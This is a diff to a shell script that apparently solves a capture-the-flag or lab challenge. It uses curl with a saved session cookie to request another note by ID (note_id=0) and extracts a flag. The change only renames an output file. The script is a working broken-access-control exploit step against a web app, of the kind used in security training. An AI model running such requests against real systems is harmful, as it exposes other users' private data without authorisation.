@@ -31,8 +31,8 @@ curl -s -X POST "http://$target_ip" -b /work/1-cookies.txt -L -H "Content-Type: 
 
 # Use the PHPSESSID for the next HTTP request
 echo "3 - FETCHING PROTECTED RESOURCE"
-curl -s -X GET "http://$target_ip/note.php?note_id=0" -b /work/1-cookies.txt -H "Content-Type: application/json" -o /work/1-bac-flag.html -L
-echo "--> Flag is : $(sed -n 's/.*<pre>\(.*{.*}\)<\/pre>.*/\1/p' /work/1-bac-flag.html)"
+curl -s -X GET "http://$target_ip/note.php?note_id=0" -b /work/1-cookies.txt -H "Content-Type: application/json" -o /work/1-flag.html -L
+echo "--> Flag is : $(sed -n 's/.*<pre>\(.*{.*}\)<\/pre>.*/\1/p' /work/1-flag.html)"
 
 # Clean up
 rm -f /work/1-cookies.txt
